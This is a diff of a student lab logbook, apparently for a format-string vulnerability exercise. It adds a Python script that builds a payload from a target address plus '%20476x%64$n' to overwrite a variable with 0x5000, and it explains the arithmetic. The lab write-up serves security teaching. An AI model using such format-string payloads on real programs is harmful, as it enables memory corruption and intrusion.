@@ -115,7 +115,7 @@ import sys
 content = (0x080e5068).to_bytes(4,byteorder='little') + ("%64$n").encode('latin-1')
 
 # Write the content to badfile
-with open('badfile', 'wb') as f:
+with open('badfile1', 'wb') as f:
   f.write(content)
 ```
 
@@ -124,3 +124,23 @@ with open('badfile', 'wb') as f:
 ![Task3A_1](../docs/logbook7/task3a.png)
 
 After examining the output, we can see that the target variable value changed.
+
+## Task 3.B: Change the value to 0x5000
+
+In order to change the target variable value to 0x5000 we build the following python scrip:
+```
+import sys
+
+content = (0x080e5068).to_bytes(4,byteorder='little') + ("%20476x%64$n").encode('latin-1')
+
+# Write the content to badfile
+with open('badfile3', 'wb') as f:
+  f.write(content)
+```
+
+We know that 0x5000 is 20480 in decimal. First we write the 4 bytes for the address. Then, the remaining 20476 bytes will be filled using the %x format with a fixed width. Using %[width]x == %20476x, the program will read 20476 bytes and will try to print them. In the end, the %n specifier will stop it from printing those bytes, but still count them, so the value stored in the address will be the value that we want.
+
+![Task3B](../docs/logbook7/task3b_1.png)
+![Task3B_1](../docs/logbook7/task3b.png)
+
+After seeing the output, the value of the target variable was changed to 0x00005000 as we wanted.
